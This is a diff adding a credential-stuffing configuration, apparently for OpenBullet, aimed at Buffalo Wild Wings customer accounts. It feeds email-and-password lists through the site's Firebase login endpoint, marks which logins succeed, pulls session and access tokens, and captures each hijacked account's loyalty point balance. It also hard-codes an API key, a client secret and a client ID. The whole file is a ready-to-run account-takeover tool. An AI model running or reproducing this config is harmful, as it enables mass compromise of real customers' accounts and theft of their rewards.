@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "BuffaloWildWings",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-01-19T16:55:25.5292269+00:00",
+  "AdditionalInfo": "",
+  "Author": "TheArchitect",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!REQUEST POST "https://us-central1-buffalo-united.cloudfunctions.net/handleLegacyUser" 
+!  CONTENT "{\"data\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+!  CONTENTTYPE "application/json" 
+!  HEADER "Host: us-central1-buffalo-united.cloudfunctions.net" 
+!  HEADER "Connection: keep-alive" 
+!  HEADER "Content-Length: 67" 
+!  HEADER "Origin: https://www.buffalowildwings.com" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+!  HEADER "content-type: application/json" 
+!  HEADER "Accept: */*" 
+!  HEADER "Referer: https://www.buffalowildwings.com/en/account/log-in/" 
+!  HEADER "Accept-Encoding: gzip, deflate, br" 
+!  HEADER "Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5" 
+
+REQUEST POST "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"returnSecureToken\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 83" 
+  HEADER "Origin: https://www.buffalowildwings.com" 
+  HEADER "X-Client-Version: Chrome/JsCore/6.6.2/FirebaseCore-web" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "X-Client-Data: CIa2yQEIpbbJAQjEtskBCKmdygEIqKPKAQixp8oBCOKoygEI8anKAQiXrcoBCM2tygEI97TKAQ==" 
+  HEADER "Referer: https://www.buffalowildwings.com/en/account/log-in/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5" 
+
+!KEYCHECK 
+!  KEYCHAIN Failure OR 
+!    KEY "Invalid Credentials" 
+!  KEYCHAIN Success OR 
+!    KEY "message\":\"INTERNAL" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "displayName" 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_PASSWORD" 
+    KEY "EMAIL_NOT_FOUND" 
+
+PARSE "<SOURCE>" JSON "idToken" -> VAR "idToken" 
+
+REQUEST POST "https://us-central1-buffalo-united.cloudfunctions.net/getSession" 
+  CONTENT "{\"data\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <idToken>" 
+
+PARSE "<SOURCE>" JSON "ProfileId" -> VAR "ProfileId" 
+
+PARSE "<SOURCE>" JSON "AccessToken" -> VAR "AccessToken" 
+
+REQUEST GET "https://api.buffalowildwings.com/loyalty/v1/profiles/<ProfileId>/pointBalance?status=A" 
+  
+  HEADER "Host: api.buffalowildwings.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X_CLIENT_SECRET: 786c1B856fA542C4b383F3E8Cdd36f3f" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://www.buffalowildwings.com" 
+  HEADER "Authorization: OAuth <AccessToken>" 
+  HEADER "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" 
+  HEADER "X_CLIENT_ID: 4171883342bf4b88aa4b88ec77f5702b" 
+  HEADER "Referer: https://www.buffalowildwings.com/en/account/view-profile/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5" 
+
+PARSE "<SOURCE>" JSON "PointAmount" CreateEmpty=FALSE -> CAP "Point Balance" 
+
